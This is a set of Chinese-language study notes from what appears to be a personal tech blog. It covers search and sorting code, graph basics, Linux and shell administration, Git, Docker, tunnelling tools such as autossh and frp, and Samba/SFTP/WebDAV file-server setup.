DataType s[], int m, int l, KeyType key){ //索引表中顺序查找关键字为key的记录。索引表为ls[0]-ls[m-1] //顺序表为s，块长为l //在索引表中顺序查找 i=0; while(i\u0026lt;m \u0026amp;\u0026amp; key\u0026gt;ls [i ].key)i++; //块间查找 if(i\u0026gt;=m)return -1; //查找失败 else{ //在块内顺序查找 j=ls[ i ].Link; while(Key!=s[j].key \u0026amp;\u0026amp; j-ls[ i ].Link\u0026lt;l)j++; if(key = = s[j].key)return j; //查找成功 else return -1; //查找失败 } } 哈希表查找 以 h(key) 哈希函数 作为 key 的记录在表中的位置，常见构造方法有： 直接哈希：适用于地址集合大小 == 关键字集合大小 数字分析：取随机 平方取中：取关键字平方后的中间几位 折叠：关键字分割后求和 除留取余：除某个不大于哈希表长度的数后取余 随机数：取随机数 冲突处理方法： 开放地址：线性探测、平方探测、随机探测 再散列 再哈希：将 n 个不同哈希函数排成序列，往下计算 链地址：将关键字发生冲突的记录存储在一个线性链表中 公共溢出：将发生冲突的放在冲突表中 ALS 影响因素： 选用的哈希函数 冲突处理方法 哈希表饱和度、装载因子 n/m 的大小 排序 基本概念 稳定性：对于任意的数据元素序列，以在排序前后相同关键字数据的相对位置是否改变为依据\n内外部：\n无需借助外存，称内部排序 数据量巨大，需要借助外村，称外部排序 插入 直接插入： 1 2 3 4 5 for ( i=2; i\u0026lt;=n; ++i ) if (R[i].key\u0026lt;R[i-1].key) { 在 R[1..i-1]中查找R[i]的插入位置; 插入R[i] ; } 折半插入\n因为 R[1..i-1] 是一个按关键字有序的有序序列，则可以利用折半查找实现 希尔排序\n对于n较大而且无序时，直接插入排序效率就较低，这时，如果能将序列分成几个较小的序列，对这些较小的序列先排序，然后再对较长的序列进行排序，可一定程度地提高排序效率。 步骤： 先选取一个小于n的整数di（步长），然后把待排序的序列分成di个组 第一趟完成之后，减小步长，再进行分组，再排序，如此知道 d=1 交换 冒泡排序 基于两两比较及交换，直到某一趟没有发生数据的交换为止。 改进：记下上次交换的位置 1 2 3 4 5 6 7 8 9 10 11 12 13 void Bubble_Sort(DataType R[], int n){ //对长度为n的序列R按升序进行冒泡排序，降序排序类似 for(i=1; i\u0026lt;n; ++i){ swap=0; //交换标志 for(j=1; j\u0026lt;=n-i; ++j){ // 可以改进成 j\u0026lt;i if(R[j].key\u0026gt;R[j+1].key){ 不满足升序规则，交换 R[0]=R[j+1]; R[j+1]=R[j]; R[j]=R[0]; swap=1; } if(swap==0) break; //此趟冒泡没有发生交换，排序结束 } } } 图和贪心算法 贪心 顾名思义，贪心算法总是作出在当前看来最好的选择。也就是说贪心算法并不从整体最优考虑，它所作出的选择只是在某种意义上的局部最优选择。当然，希望贪心算法得到的最终结果也是整体最优的。\n例：活动安排问题\n将输入的活动按结束时间的非降序排列，只需 O(n) 即可 当一个问题的最优解包含其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。证明需用归纳证明。\n例：0-1 背包问题\n贪心不适用，应该比较选择 / 不选择该物品导致的最优方案\n例：多机调度问题\n图 图G是由两个集合 V(G) 和 E(G) 组成的,记为G=(V,E)其中：V(G)是顶点的非空有限集、E(G)是边的有限集合，边是顶点的无序对或有序对\n还有一些基本概念，这里略过，参考离散数学\n存储结构 顺序结构 邻接矩阵：表示顶点间关系的矩阵，即点*点的矩阵，若两点间有边相连，则标记为 1（或者有权值）\n关联矩阵：表示顶点与边的关联关系，即点*边的矩阵，边的两顶点记为 1 或 -1\n链式存储 邻接表：为图中每个顶点建立一个单链表，第 i 个单链表中的结点表示依附于顶点V的边（有向图中指以V为尾的弧）。即每条边对应一个非头节点，由头指向尾（反过来就是逆邻接表）\n十字链表：节点间以弧尾相同连接，包含弧尾、弧头位置以及弧尾弧头相同的下一条弧。\n定义：\n注意一下弧头和弧尾的区分\n无向图邻接多重表：节点间以顶点相同互相连接\n定义：\n图的遍历 深度优先（DFS）\n方法：从图的某一顶点Vo出发，访问此顶点，然后依次从Vo的未被访问的邻接点出发，深度优先遍历图直至图中有和V0相通的顶点都被访问到；若此时图中尚有顶点未被访问，则另选图中一个未被访问的顶点作起点，重复上述过程，直至图中所有顶点都被访问为止 广度优先（BFS）\n方法：从图的某一顶点Vo出发，访问此顶点后，依次访问V0的各个未曾访问过的邻接点：然后分别从这些邻接点出发，广度优先遍历图，直至图中所有已被访问的顶点的邻接点都被访问到；若此时图中尚有顶点未被访问，则另选图中一个未被访问的顶点作起点，重复上迷过程，直至图中所有顶点都被访问为止 ","date":"2025-10-22T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251022104404297.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"数据结构与算法"},{"content":"Linux 入门 御林招新题：DevOps-Linux入门\n一、环境搭建 完成centos7版本Linux系统的服务器与云服务器部署，通过终端工具远程连接操作。\n二、命令基础 口令修改：passwd命令修改用户密码。 基础命令：ls（查看目录）、mkdir（创建目录）、cd（切换目录）。 cd -：切换到上次所在目录\n帮助查询：man 命令名获取命令详细帮助，如man ls。 三、文件与目录操作 定位切换：pwd显示当前目录，cd切换目录。 查看操作：ls搭配-l（详细属性）、-lh（人性化大小）、-t（时间排序）、-a（隐藏文件）等选项。 目录管理：mkdir创建、rmdir删除空目录。 文件操作：touch创建空文件；cp（复制）、mv（移动/重命名）、ln（硬链接）、ln -s（软链接）、rm（删除）。 内容查看：cat命令查看文件内容（不可查看目录）。 Q1: 如何实时查看一个正在增长的日志文件？\ntail -f file Q2: 如果日志文件被logrotate归档（重命名）了，tail -f会怎样？如何保证持续跟踪？\ntail -f 会停止输出 (因为它跟踪的是inode)。应该用 tail -F，它会检测文件名变化并重新打开文件。 grep\n-r 递归查找，-l 只列出文件名 watch [选项] 命令\n-n 秒数：指定执行命令的间隔时间（默认 2 秒）。\n-d：高亮显示两次输出之间的差异（方便观察变化部分）。\n-t：不显示顶部的标题栏（包含执行时间、命令等信息）。\n四、文件和目录权限 权限解读：10位权限字符串，第1位为文件类型，2-4位所有者权限，5-7位所属组权限，8-10位其他用户权限；r=4、w=2、x=1、-=0。 权限修改：chmod [用户][操作][权限] 文件名，用户含u/g/o/a，操作含+/-/=。 五、vi编辑器 基础操作：vi 文件名创建文件；:wq保存退出，:q!强制退出。 光标移动：k/j/h/l上下左右，w/b单词间移动，^/$行首尾，gg/G文首尾。 文本编辑：i/I/a/A/o/O进入插入模式；nx（删n字符）、ndd（删n行）删除内容；r/R修改内容。 进阶功能：:set number显示行号；:!command执行系统命令；:%s/old/new/g全局替换；/pattern查找内容。 复制撤销：nyy复制n行、p粘贴；u撤销、ctrl+r重做。 六、文件操作进阶 通配符：ls a*查找指定目录下以a开头的文件。 文件查找：find 目录 -type f [-name] -printf \u0026quot;%f\\n\u0026quot;查找文件并显示文件名。 内容排序：sort（正序）、sort -r（逆序）排序文件内容。 部分显示：head -n 数字（前n行）、tail -n 数字（后n行）。 sed 流编辑器 sed [选项] '编辑命令' 文件 sed 's/old/new/g' file：替换所有行中的 old 为 new（s 是替换操作） awk '模式 { 动作 }' 文件 用于信息统计 七、文件权限进阶 链接区别：软链接适用于跨分区/目录快捷方式；硬链接适用于同一分区文件共享，源文件删除仍可用。 硬链接: 共享同一个inode，本质是同一个文件。删除一个不影响另一个，直到inode引用计数为0。不能跨文件系统，不能链接目录(防止创建循环引用，导致遍历混乱)。\n软链接: 一个独立文件，内容是它所指向文件的路径。类似快捷方式。\n权限恢复：chmod u=rwx,g=rx,o=rx 目录名或chmod 755 目录名恢复默认权限。 ls -l 输出格式是？ 第一位是文件类型 d: 目录, -: 文件, l: 链接 所有者读写执行-组用户读执行-其他用户读执行 如何递归添加权限？ chmod -R a+r mydir 什么是 SUID, SGID 和 Sticky Bit (粘滞位)？ SUID：当普通用户执行带有 SUID 权限的可执行文件时，该进程的有效用户 ID（UID）会临时变为文件所有者的 UID。 chmod 4755 test.sh SGID：用于文件类似SUID；用于目录则在此目录中创建的新文件，其所属组会自动继承目录的所属组。 chmod 2775 /opt/project StickyBit：只有目录所有者、文件所有者或root才能删除目录中的文件 chmod 1777 /tmp 如何查看一个用户的UID, GID 和他属于的所有组？ id name 如何把用户 www-data 添加到 docker 组，并且不覆盖他已有的组？ usermod -aG docker www-data (-a 代表 append 追加) Linux 进阶 御林招新题：Linux 进阶\n一、系统与进程管理 特殊进程：PID为1的是init进程，是系统首个用户空间进程，作为所有进程的祖先，负责系统初始化、服务启动、运行级别设置及系统关闭收尾工作。 进程查看：ps -A -f查看所有活跃进程，通过PID（进程ID）和PPID（父进程ID）分析父子关系。 端口与进程处理：用lsof或netstat（搭配-t/-u/-l/-p/-n等选项）查找占用指定端口的进程PID；通过kill -pid PID强制终止进程。 一个应用服务器突然响应很慢，你的排查思路是什么？ top/htop 看CPU/内存占用和Load Avg。 free -m / vmstat 看内存/Swap。 iostat -x / iotop 看磁盘I/O。 ss -tnp / netstat 看网络连接数。 dmesg -T 看内核/硬件有无报错。 如何查看某个进程打开了哪些文件？ lsof -p \u0026lt;PID\u0026gt;。或者进入 /proc/\u0026lt;PID\u0026gt;/fd/ 目录查看。 二、网络与文件系统 文件系统结构：采用树形结构，/为根目录，包含系统核心文件和目录，普通用户多为只读权限；/home是普通用户主目录集合，用户拥有完全操作权限。关键子目录功能： /bin：存放普通用户和超级用户均可执行的基本命令。 /sbin：存放仅超级用户可执行的系统管理命令。 /etc：存储系统各类配置文件。 /dev：存放硬件设备抽象文件。 /proc：虚拟文件系统，反映系统运行状态。 /usr：存放用户安装的应用程序及文件。 /var：存放日志、邮件等动态变化文件。 /tmp：存放临时文件，系统重启后清空。 GRUB：统一引导加载程序，负责系统启动时加载Linux内核并移交控制权，支持多系统启动选择和内核参数临时修改。 Nginx 相较 Apache 有什么优势？\nNginx：事件驱动 (Event-driven), 异步非阻塞 (Asynchronous)。内存占用少，高并发能力强，非常适合做反向代理和静态文件服务。 Apache：传统进程/线程模型 (prefork/worker)。功能模块丰富 (如 .htaccess)，但在高并发下资源消耗大。 Nginx 如何实现负载均衡？\nupstream backend { server 1.1.1.1; server 1.1.1.2; }\n1 2 3 4 5 server { listen 80; server_name your-domain.com; location / { proxy_pass http://localhost:3000; proxy_set_header Host $host; } } 三、文件内容处理 模式查找：grep '^t' /etc/passwd查找/etc/passwd中以t开头的文本行。 管道与重定向：grep -E [0-9] /etc/passwd | wc -l \u0026gt; hello/digit_count.txt，统计文件中含数字的行数并将结果重定向到指定文件。 四、高级系统管理 systemd服务： 编写.sh脚本实现每分钟向指定日志文件写入当前时间。 配置service文件，通过systemctl enable启用开机自启、systemctl start启动服务，systemctl status查看服务状态。 内核模块：lsmod列出已加载内核模块；modprobe 模块名加载模块，modprobe -r 模块名卸载模块。如dummy虚拟网络设备模块，可用于网络测试、服务绑定隔离等场景。 你修改了一个 sshd.service 的 .service 配置文件 (e.g. 更改了启动参数)，为什么 systemctl restart sshd 后不生效？ 修改 systemd 的单元(unit)文件后，必须先执行 systemctl daemon-reload 来重载配置，然后再 restart 服务。 systemctl reload nginx 和 systemctl restart nginx 有什么区别？ restart: \u0026ldquo;先停后启\u0026rdquo;。 reload: \u0026ldquo;平滑重载\u0026rdquo;。不杀死主进程，只让主进程重读配置，并优雅地启动新的worker进程，旧的worker进程服务完当前请求后退出。服务不中断。 当修改了 nginx 上游配置时(比如 nginx.conf 里 load_module 路径）或 .service 文件，必须 restart 五、现代文件系统 以Btrfs为例：\n创建与挂载：通过虚拟磁盘模拟分区，用mkfs.btrfs格式化，mount命令挂载到指定目录，btrfs subvolume create创建子卷。 快照与回滚：btrfs subvolume snapshot -r创建只读快照；修改源文件后快照内容保持不变，通过删除源子卷并基于快照重新创建实现回滚。 什么是LVM？它相比传统分区的核心优势是什么？ LVM (Logical Volume Manager) 逻辑卷管理。它在物理磁盘(PV)和文件系统之间加了一个抽象层(VG, LV)。 核心优势: 弹性伸缩。可以轻松地扩容或缩容文件系统，甚至跨越多块物理磁盘。 描述一下LVM扩容一个已挂载目录 (e.g. /data) 的完整步骤。 (如有新硬盘) pvcreate /dev/sdc。 vgextend vg_data /dev/sdc (VG扩容)。 lvextend -L +100G /dev/vg_data/lv_data (LV扩容)。 resize2fs /dev/vg_data/lv_data (文件系统扩容, 假设是ext4)。 六、系统优化与维护 缓存与日志管理：journalctl --since \u0026quot;10 minute ago\u0026quot; | grep -E \u0026quot;error|fail\u0026quot;查看指定时间内含目标关键字的系统日志；journalctl --vacuum-time=7d清除超过7天的系统日志。 内核参数调整： sysctl net.core.somaxconn net.ipv4.tcp_max_syn_backlog查看TCP最大连接数限制参数。 sysctl -w net.core.somaxconn=50000临时修改参数值，sysctl -a验证生效。 影响：提升高并发Web服务器的连接处理能力，但会增加内存消耗，资源不足时可能导致系统不稳定。 内核模块内核模块通常放在哪个目录下？ /lib/modules/$(uname -r)/ 七、软件包与服务管理 安装命令的区别 dnf install \u0026lt;软件名\u0026gt;：从系统已配置的 软件仓库（repo） 中下载并安装软件包。 dnf localinstall \u0026lt;本地包文件.rpm\u0026gt;：安装本地已下载的 .rpm 包文件 无网络时自己配置镜像源：配置 /etc/yum.repos.d/local.repo Linux 防火墙 待补充\n服务器与 PC 硬件知识 PC 硬件基础 装机大致流程 CPU装主板 -\u0026gt; 涂硅脂 -\u0026gt; 装散热。 内存条插主板。 M.2 SSD 装主板。 主板装进机箱 (固定IO挡板)。 装电源，并连接主板供电、CPU供电。 (如有) 装显卡，连接显卡供电。 连接机箱跳线 (开机、重启、指示灯)。 理线，盖侧板。 服务器硬件 RAID 5: 至少3块盘，N-1容量，条带化+分布式奇偶校验。 优点：读性能好，空间利用率高。 缺点：写性能一般（有校验开销），一块盘坏后重建时性能差且风险高。 RAID 10: (RAID 1+0)，至少4块盘。先做RAID 1镜像，再做RAID 0条带。 优点：读写性能都很好，冗余性高（每组镜像坏一块盘仍可工作）。 缺点：空间利用率低 (50%)。 服务器的 ECC 内存条： 能检测并纠正单位比特的内存错误。服务器追求高稳定性，内存错误可能导致数据损坏或系统崩溃，所以必须用ECC。 会有一定性能开销（读写校验位），但完全值得 热插拔(Hot-Swap) 在服务器不关机的情况下，可以安全地移除或插入硬件。最常见的是热插拔硬盘和电源。 物理接口(SAS/SATA)支持 操作系统和RAID卡支持，允许在运行时\u0026quot;摘除\u0026quot;和\u0026quot;加入\u0026quot;设备 (e.g. echo 1 \u0026gt; /sys/block/sda/device/delete)。 shell 基础 御林招新题：shell 入门\n一、重定向与管道 三大标准流概念 标准输入（stdin）：默认从键盘获取输入。 标准输出（stdout）：默认输出到终端，展示程序正常结果。 标准错误（stderr）：默认输出到终端，展示程序错误信息。 输出重定向 \u0026gt;：覆盖式重定向标准输出到文件，文件不存在则创建。 \u0026gt;\u0026gt;：追加式重定向标准输出到文件。 2\u0026gt;：覆盖式重定向标准错误到文件。 2\u0026gt;\u0026gt;：追加式重定向标准错误到文件。 管道操作：| 将前一个命令的标准输出作为后一个命令的输入，如 ls | grep 'txt' 筛选出含 “txt” 的文件名。 二、变量与引号 变量操作 定义：变量名=值（等号两侧无空格）。 引用：$变量名 或 ${变量名}。 取消定义：unset 变量名。 引号区别 单引号 ' '：完全原样输出内容，不进行变量、命令替换。 双引号 \u0026quot; \u0026quot;：支持变量替换和命令替换（配合 $() 或反引号）。 反引号 ：执行内部命令并返回输出结果，推荐用 $() 替代以支持嵌套。 三、参数与条件判断 命令行参数\n$1~$n：对应第 1 到第 n 个命令行参数。 $#：参数总个数；$0：脚本文件名。 $*：将所有参数视为单个字符串；$@：将每个参数视为独立字符串。 条件判断\n基础语法： 1 2 3 4 5 6 7 if [条件1]; then # 条件1为真时执行的命令 elif [条件2]; then # 条件2为真时执行的命令 else # 所有条件都为假时执行的命令 fi test 命令和 []（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。[] 是 test 命令的另一种写法，使用起来更简洁。\n文件：-e（存在）、-f（普通文件）、-d（目录）等。 字符串：=（相等）、!=（不等）、-z（空字符串）等。 数字：-eq（相等）、-gt（大于）、-lt（小于）等。 四、循环 for 循环 遍历元素：for 变量 in 元素1 元素2...; do 命令; done。 范围遍历：for 变量 in {起始值..结束值}; do 命令; done。 while 循环：while 条件; do 命令; done，条件为真时重复执行循环体。 关键注意点 参数判断需用双引号包裹变量，避免空格等特殊字符问题。 遍历目录文件需用 \u0026quot;$1\u0026quot;/* 表示目录下所有内容。 echo -n 可取消默认换行，按需手动添加换行保证格式整洁。 .bashrc 和 .bash_profile 的差别？\n.bash_profile: 只在 \u0026ldquo;Login Shell\u0026rdquo; (登录Shell，如SSH登入) 时加载一次。 .bashrc: 在 \u0026ldquo;Interactive Non-Login Shell\u0026rdquo; (交互式非登录Shell，如打开新终端窗口) 时加载。 alias 是什么？\n简化命令的配置，写入用户 .bashrc 等配置文件\n如果加在了 .bashrc，在系统SSH登入时只加载 .bash_profile，.bash_profile 需要 source ~/.bashrc。\n1 2 3 if [ -f ~/.bashrc ]; then . ~/.bashrc fi 脚本开头 set -e / set - u\nset -e: \u0026quot;Exit on Error\u0026quot;。脚本中任何命令返回非0退出码（即出错）时，立即退出。 set -u: \u0026quot;Unbound Variable\u0026quot;。试图使用未定义的变量时，视为错误并退出。 screen 和 tmux 的作用？\n会话保持：SSH断开连接后，服务器上的任务（如编译、跑脚本）不会中断。\n多路复用：在一个终端窗口中创建多个\u0026quot;窗口\u0026quot;和\u0026quot;窗格\u0026quot;，方便同时操作。\n操作 screen 命令 / 快捷键 tmux 命令 / 快捷键 新建会话 screen 或 screen -S 会话名 tmux 或 tmux new -s 会话名 列出所有会话 screen -ls tmux ls 或 tmux list-sessions 断开当前会话 Ctrl + a + d Ctrl + b + d 重新连接会话 screen -r 会话名/ID tmux attach -t 会话名/ID 新建窗口 Ctrl + a + c Ctrl + b + c 垂直拆分面板 需额外配置 Ctrl + b + % 横向拆分面板 需额外配置 Ctrl + b + \u0026quot; Git版本管理 御林招新题：Git 版本管理\n一、安装与配置 安装验证：在Linux系统安装Git后，通过git --version命令确认安装成功。 全局配置：配置提交者信息，命令如下： git config --global user.name \u0026quot;用户名\u0026quot; git config --global user.email \u0026quot;邮箱地址\u0026quot; 二、仓库创建与克隆 本地仓库：在目标文件夹中初始化Git仓库（具体命令未明确给出，常规为git init）。 远程克隆：使用git clone 远程仓库地址克隆公开仓库到本地，例如git clone https://github.com/calendar0917/learning_log.git。 代理配置：可通过clashctl on开启代理、clashctl off关闭代理等命令配置网络代理以解决克隆问题。 三、文件提交与同步 暂存与提交 git add 文件名：将修改文件添加到暂存区。 git commit -m \u0026quot;提交信息\u0026quot;：提交暂存区文件并添加说明。 凭据缓存：配置Git凭据缓存避免重复登录，命令如下： git config --global credential.helper cache（默认缓存15分钟） git config --global credential.helper 'cache --timeout=2592000'（自定义缓存时间，如30天） 远程同步 git pull：从远程仓库拉取最新变更。 git push：将本地提交推送到远程仓库，需输入用户名及Personal Access Token验证。 四、分支管理 分支操作 创建分支：git branch 分支名（如git branch feature-a）。 切换分支：git checkout 分支名。 创建并切换分支：git checkout -b 分支名。 修改与合并 在分支上修改文件后，执行git add和git commit提交变更。 切换回主分支（main/master），通过git merge 分支名合并分支修改。 分支删除：合并完成后，用git branch -d 分支名删除分支。 五、历史记录与回溯 查看历史：git log命令查看提交历史，包含提交ID、作者、时间及提交信息。 核心概念 工作区：实际存放项目文件的可见目录。 暂存区：临时保存文件修改的区域，通过git add添加文件至此。 版本回溯 git revert 提交ID：创建新提交抵消目标提交的修改，不改变历史记录。 git reset：重置HEAD指针到指定版本，不同模式效果不同： --hard：重置HEAD指针、暂存区和工作区。 --soft：仅重置HEAD指针，保留暂存区和工作区内容。 --mixed：重置HEAD指针和暂存区，保留工作区内容。 六、远程仓库进阶 添加远程仓库：git remote add 仓库别名 仓库地址，例如git remote add gitee https://gitee.com/calendar917/learning_log.git。 查看远程仓库：git remote -v查看已配置的远程仓库信息。 多仓库同步：git push 仓库别名 分支名将本地分支推送到指定远程仓库，如git push gitee main。 Docker入门 御林招新题：docker 入门\n一、安装与配置 安装验证：在Linux系统安装Docker Engine后，通过docker version和docker info命令确认安装与配置正常。 镜像源配置：配置国内镜像源以提升镜像下载速度。 二、运行容器 基础容器操作 拉取镜像：docker pull 镜像名，例如docker pull hello-world。 运行容器：docker run 镜像名，如docker run hello-world可观察容器输出。 进阶容器运行 拉取并运行searxng容器：docker pull searxng/searxng，docker run -d -p 8080:8080 searxng/searxng。 关键参数：-d（后台运行）、-p 主机端口:容器端口（端口映射）、-v 主机目录:容器目录（数据卷挂载）、--name（指定容器名）、-it（交互式运行）。 验证：浏览器访问http://localhost:8080确认searxng服务正常。 三、核心概念 镜像（Image）：类似不可修改的安装包，整合了应用所需的运行环境。 容器（Container）：基于镜像创建的可操作实例，是独立隔离的沙箱环境，支持启动、删除等操作。 Dockerfile：自动化构建镜像的配置文件，可编写镜像所需环境，替代手动安装操作。 四、Docker Compose 工具作用：Docker官方工具，用于定义和运行多容器应用，可统一管理多个容器的启停、网络配置及数据卷挂载，解决多容器协同操作的繁琐问题。 配置文件：docker-compose.yml是核心配置文件，可定义服务（指定镜像、端口映射等）、网络（实现容器间通信）、数据卷（实现数据共享）。 五、编写Dockerfile 功能需求 基于最新ubuntu镜像，安装nginx并设置其在容器启动时自动运行。\n实现代码 1 2 3 4 5 FROM ubuntu:latest RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y nginx \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] 操作与验证 构建镜像：docker build -t my-ubuntu-nginx .。 运行容器：docker run -d -p 80:80 my-ubuntu-nginx。 说明：Ubuntu镜像为精简根文件系统，共享宿主机Linux内核，体积小无需完整下载。 六、Docker Compose部署多服务 功能需求 部署nginx服务（端口映射8081:80）和mysql服务（设置root密码）。\n配置文件（docker-compose.yml） 1 2 3 4 5 6 7 8 9 10 11 12 version: \u0026#39;3\u0026#39; services: nginx-service: image: nginx:latest ports: - \u0026#34;8081:80\u0026#34; mysql-service: image: mysql:latest environment: MYSQL_ROOT_PASSWORD: 1234 ports: - \u0026#34;3306:3306\u0026#34; 操作与验证 启动服务：docker compose up -d。 确认运行：docker ps查看两个容器的运行状态。 Docker进阶 御林招新题：docker 进阶\n一、多阶段构建 概念与优势：在单个Dockerfile中定义多个构建阶段，构建阶段使用含编译、打包工具的完整镜像完成构建操作，运行阶段使用轻量级镜像仅复制构建产物，可剔除冗余内容，大幅精简镜像体积。 实战案例（打包Python Flask应用） 构建阶段：基于python:3.9镜像，设置工作目录，复制并安装依赖，复制应用代码。 运行阶段：基于python:3.9-slim轻量镜像，从构建阶段复制依赖文件、应用代码及安装好的依赖包，暴露端口并启动应用。 关键说明：直接使用轻量镜像单阶段构建可能因缺少编译工具导致依赖安装失败；可通过临时容器或单阶段容器输出依赖路径，确定需复制的文件路径。 效果验证：多阶段镜像（148MB）远小于单阶段镜像（1.1GB），差异源于基础镜像精简及冗余内容剔除。 二、镜像版本管理与标签 标签操作：使用docker tag \u0026lt;镜像ID\u0026gt; 镜像名:\u0026lt;标签\u0026gt;为镜像打标签，例如为多阶段镜像添加1.0.0和latest标签。 验证方式：通过docker images命令查看镜像标签是否正确应用，同一镜像可对应多个标签。 三、镜像的打包与加载 打包镜像：docker save -o 文件名.tar 镜像名:标签，将指定镜像打包为tar文件，用于无Docker Registry环境下的镜像迁移。 加载镜像：先通过docker rmi 镜像名:标签删除本地原有镜像，再用docker load -i 打包文件.tar加载镜像。 验证步骤：执行docker images确认镜像加载成功，运行镜像验证其可用性。 四、推送到私有仓库 操作流程 启动本地临时Docker Registry容器。 用docker tag命令为镜像添加指向私有仓库的标签（如localhost:5000/your-app:1.0.0）。 执行docker push将镜像推送到私有仓库。 用docker pull从私有仓库拉取镜像，验证推送与拉取流程。 补充说明：删除多标签镜像时，仅删除指定标签，直至最后一个标签删除才会彻底删除镜像；多容器应用（基于Docker Compose）可在配置文件目录下用docker compose stop统一停止。 内网穿透与流量转发 御林招新题：内网穿透与流量转发专题\n一、Nginx 反向代理 概念：客户端向反向代理服务器发请求，代理服务器转发至内网实际服务器，再将响应返回客户端，客户端无需知晓内网服务详情，Nginx 可承担该角色。 实操步骤 在公网服务器安装 Nginx。 修改配置文件，添加 server 块，通过 proxy_pass 指令将请求转发到内网服务的 IP 和端口，同时配置请求头传递参数。 验证：通过公网 IP 访问 Nginx 服务器，确认能显示内网服务页面。 二、Autossh 端口转发 核心作用：封装 SSH 工具，自动监控并重建断开的 SSH 反向隧道，保证连接持久性，实现内网端口暴露到公网。 实操步骤 内网机器安装 Autossh，生成 SSH 公钥并上传至公网服务器。 执行命令建立反向隧道：autossh -M 20000 -fCNR public_server_ip:8000:localhost:5000 root@public_server_ip。 关键配置：修改公网服务器 sshd_config 中 GatewayPorts 为 yes，开放安全组对应端口。 验证：访问公网服务器的指定端口，确认能连接内网服务。 三、Tailscale 零配置网络 概念：搭建零配置虚拟私有网络（VPN），简化配置流程，实现不同网络环境设备的点对点互联。 实操步骤 在公网服务器和内网机器分别安装 Tailscale，注册并登录账户加入网络。 查看设备的 Tailscale IP，通过该 IP 直接访问内网服务。 验证：在公网服务器上通过内网机器的 Tailscale IP 访问其服务，无需端口转发。 四、Frp (Fast Reverse Proxy) 概念：高性能内网穿透反向代理应用，采用客户端-服务端模式暴露内网服务。 实操步骤 下载 Frp 安装包，在公网服务器部署服务端（frps），内网机器部署客户端（frpc）。 配置服务端 frps.ini 的通信端口，客户端 frpc.ini 的服务端地址、本地服务地址及公网映射端口（建议用 TCP 类型避免域名依赖）。 分别启动服务端和客户端程序。 验证：通过公网服务器的 IP 和配置的映射端口，访问内网服务。 文件服务器 御林招新题：文件服务器\n一、文件共享协议理解 SMB/CIFS 作用：局域网内实现文件、打印机等资源共享，Windows 网络原生支持，访问方式接近本地文件。 典型场景：企业 Windows 办公网络共享文档、学校计算机教室共享教学资料。 特点：局域网传输高效、使用便捷，但安全性不足。 SFTP 作用：基于 SSH 协议的安全文件传输协议，传输过程加密，保障数据安全。 典型场景：Linux 服务器间文件备份同步、开发者向远程 Linux 服务器上传代码/下载日志。 特点：跨平台兼容性好、传输稳定可靠，但加密会消耗性能，功能专注于文件传输。 二、Samba 服务配置（SMB/CIFS） 实操步骤 安装：sudo yum install samba samba-client samba-common。 创建用户：sudo useradd sambauser，sudo smbpasswd -a sambauser 设置 Samba 密码。 配置共享：创建共享目录并设置权限，修改 /etc/samba/smb.conf，添加共享配置（指定路径、授权用户等），重启服务 sudo systemctl restart smb nmb。 验证：局域网内 Windows/macOS 设备通过 \\\\服务器IP 访问共享目录，测试文件上传。 三、SFTP 服务配置 实操步骤 准备：安装 SSH 服务 sudo yum install openssh-server，启动服务 sudo systemctl start sshd。 创建用户：sudo useradd sftpuser，sudo usermod -s /sbin/nologin sftpuser 限制 Shell 登录。 配置服务：备份并修改 /etc/ssh/sshd_config，注释原有 SFTP 配置，启用 internal-sftp，匹配用户并限制访问目录，重启 SSH 服务。 验证：使用 FileZilla 等客户端连接，测试文件上传，确认无法执行 Shell 命令。 注意：需将用户主目录权限设为 755 且归属 root，检查配置文件语法避免报错。 四、权限精细化管理 实操步骤 创建组：sudo groupadd sambagrp（系统组）、sudo smbgroupadd sambagrp（Samba 组）。 配置共享目录：创建目录并设置组归属及权限，修改 smb.conf 添加组共享配置，限制仅组内用户读写。 添加用户：创建新用户并加入组，设置 Samba 密码，重启服务。 验证：组内用户可正常读写，非组用户被拒绝访问。 五、WebDAV 配置 实操步骤 安装配置：基于 Nginx 部署，下载并编译安装 Nginx 及 nginx-dav-ext-module 插件，配置系统服务。 基础配置：修改 Nginx 配置文件，设置监听端口、认证文件、共享目录及 WebDAV 相关指令，创建认证用户和共享目录。 验证：Windows 设备修改注册表并重启 WebClient 服务后，通过网络位置访问，输入凭据管理文件。 六、性能与安全性 性能测试：使用工具测试大文件传输速度，Samba 传输效率通常高于 SFTP（因 SFTP 加密消耗性能）。 安全加固 配置 SFTP 密钥认证：生成密钥对，将公钥放入服务器用户的 authorized_keys 文件，禁用密码登录（PasswordAuthentication no）。 安全优势：密钥认证采用非对称加密，私钥仅存于客户端，可防范密码暴力破解、泄露等风险，安全性远超密码认证。 Homepage 御林招新题：Homepage\n一、安装与基础配置 安装方式：推荐使用Docker Compose安装，编写docker-compose.yml文件，指定Homepage镜像、容器名称、环境变量、端口映射及配置文件挂载目录，执行docker-compose up -d启动服务。安装过程中需解决依赖问题（如加装pip3、rust环境等）。 配置调整：创建本地配置目录并挂载，通过修改环境变量HOMEPAGE_ALLOWED_HOSTS解决主机验证问题（可临时设为“*”禁用验证）；修改配置文件设置主页标题（如“我的DevOps控制台”），支持热加载生效。 二、服务添加与验证 基础服务配置：编辑service.yaml文件，按分组添加服务，配置服务名称、图标、访问链接及描述，支持添加自有服务（如Searxng）或常用网站（如GitHub、个人博客）。 验证步骤：重启Homepage服务，通过浏览器访问确认标题修改成功，服务图标可正常点击并跳转至目标页面。 三、进阶服务与集成 状态检查服务：在服务配置中添加siteMonitor参数（指定服务访问地址），实现对服务在线状态的自动检查，如配置Searxng服务的状态监控。 Docker集成：启用Docker socket挂载，安装Portainer可视化工具并配置端口映射，在Homepage中添加Portainer服务，通过配置widget实现容器状态（运行数量、CPU/内存占用等）的展示。 四、小部件定制 基础小部件添加：参考文档配置小部件，例如添加时间小部件，通过设置text_size和format参数自定义显示样式。 